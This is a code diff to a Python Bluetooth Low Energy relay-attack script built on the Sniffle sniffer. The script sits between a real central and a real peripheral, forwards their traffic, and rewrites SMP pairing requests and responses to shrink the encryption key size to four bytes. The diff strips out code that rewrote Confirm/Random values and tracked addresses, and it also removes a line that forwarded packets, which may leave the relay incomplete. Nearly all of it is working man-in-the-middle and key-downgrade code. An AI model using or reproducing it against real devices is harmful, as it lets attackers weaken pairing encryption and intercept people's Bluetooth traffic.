@@ -21,7 +21,7 @@ from sniffle.packet_decoder import DPacketMessage, DataMessage, LlDataContMessag
         str_mac, LlControlMessage, AdvertMessage
 from sniffle.relay_protocol import RelayServer, MessageType, ErrorCode
 
-from mitble_help import STATE, note_pairing_pdu_for_receiver, rewrite_confirm_random, downgrade_pairing_request, downgrade_pairing_response
+from mitble_help import downgrade_pairing_request, downgrade_pairing_response
 
 """
 Relay attack principles:
@@ -79,8 +79,6 @@ hw = None
 # global variable for pcap writer
 pcwriter = None
 
-STATE.TK = b"\x00" * 16
-DEBUG_MITM = True
 
 def sigint_handler(sig, frame):
     hw.cancel_recv()
@@ -115,7 +113,7 @@ def main():
     aparse.add_argument("--periph-baud", type=int, default=115200,
         help="Baudrate for the REAL peripheral (default: 115200)")
     args = aparse.parse_args()
-    global hw, DEBUG_MITM 
+    global hw
     hw = SniffleHW(args.serport)
     new_key_size = 0x04
 
@@ -225,21 +223,6 @@ def main():
     print("Relay slave notified us of connection request. Connecting to real target...")
     print(conn_req)
     # Receiver = real central C (checks peripheral peer on the C<->P_r link)
-    STATE.set_addrs_for_central_view(
-        ia6=conn_req.InitA, iat=int(conn_req.TxAdd),
-        ra6=conn_req.AdvA,  rat=int(conn_req.RxAdd),
-    )
-    print(f"[ADDRCTX CENTRAL] iat={int(conn_req.TxAdd)} ia={_hx(conn_req.InitA)} "
-        f"rat={int(conn_req.RxAdd)} ra={_hx(conn_req.AdvA)}")
-    connector_addr = conn_req.InitA
-    connector_random = bool(conn_req.TxAdd)
-    # Receiver = real peripheral P (checks central peer on the C_r<->P link)
-    STATE.set_addrs_for_periph_view(
-        ia6=connector_addr, iat=int(connector_random),
-        ra6=bytes(mac_bytes), rat=int(not args.public),
-    )
-    print(f"[ADDRCTX PERIPH ] iat={int(connector_random)} ia={_hx(connector_addr)} "
-        f"rat={int(not args.public)} ra={_hx(bytes(mac_bytes))}")
     global pcwriter
     if not (args.output is None):
         pcwriter = PcapBleWriter(args.output)
@@ -358,7 +341,6 @@ def sock_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
     # Downgrade entropy if this is an SMP Pairing Response coming from the relay slave
     new_packet, changed = downgrade_pairing_response(body, new_key_size)
     body = new_packet
-    note_pairing_pdu_for_receiver(body[2:], receiver_is_central=False)  # skip event_le16
     if changed:
         # Compare LL bodies (skip the 2-byte event header)
         old_ll = old_packet[2:]
@@ -373,7 +355,6 @@ def sock_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
             print("[DOWNGRADE] SMP key size changed (peripheral -> master).")
         else:
             print(f"[DOWNGRADE] {code_name} (from peripheral): key size {old_ks} -> {new_ks}")
-
         print(f"  old LL body ({len(old_ll)} bytes): {_hex_bytes(old_ll)}")
         print(f"  new LL body ({len(new_ll)} bytes): {_hex_bytes(new_ll)}")
 
@@ -382,14 +363,6 @@ def sock_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
     body = body[2:]
     llid = body[0] & 3
     pdu = body[2:]
-
-    new_ll, changed, tag = rewrite_confirm_random(body[2:], receiver_is_central=False)
-    if changed:
-        print(f"[BRIDGE->{ 'PERIPH ' }] {tag}")
-        # rebuild 'body' with the new LL body (keep the original 2-byte event)
-        body = body[:2] + new_ll
-        pdu = new_ll[2:]  # after LL hdr/len
-
     # construct packet object for display and PCAP
     pkt = DPacketMessage.from_body(body, True)
     pkt.ts_epoch = time()
@@ -416,11 +389,6 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
         if not empty and not block_req and isinstance(msg, DataMessage):
             old_body = msg.body
             new_ll, changed = downgrade_pairing_request(old_body, new_key_size)
-            note_pairing_pdu_for_receiver(new_ll, receiver_is_central=True)
-            if DEBUG_MITM:
-                if len(new_ll) > 4:
-                    if new_ll[4] == 0x01:  # crude: after L2 hdr, SMP code
-                        print(f"[ASSERT] CENTRAL.preq7 now {_hx(STATE.to_central.preq7 or b'')}")
             if changed:
                 # Best-effort: print SMP code and key sizes before/after
                 old_code, old_ks = _extract_smp_key_size_from_ll_body(old_body)
@@ -432,14 +400,6 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
                 print(f"  new LL body ({len(new_ll)} bytes): {_hex_bytes(new_ll)}")
                 msg.body = new_ll
                 # Also rewrite SMP Confirm/Random in periph->central direction
-
-        if not empty and not block_req:
-            # Forward packets to the relay slave
-            maybe_new, changed, tag = rewrite_confirm_random(msg.body, receiver_is_central=True)
-            if changed:
-                print(f"[BRIDGE->{ 'CENTRAL' }] {tag}")
-                msg.body = maybe_new
-            conn.send_msg(MessageType.PACKET, pack('<H', msg.event) + msg.body)
         if block_req:
             # LL_REJECT_EXT_IND, unacceptable connection parameters
             hw.cmd_transmit(3, b'\x11\x0F\x3B')
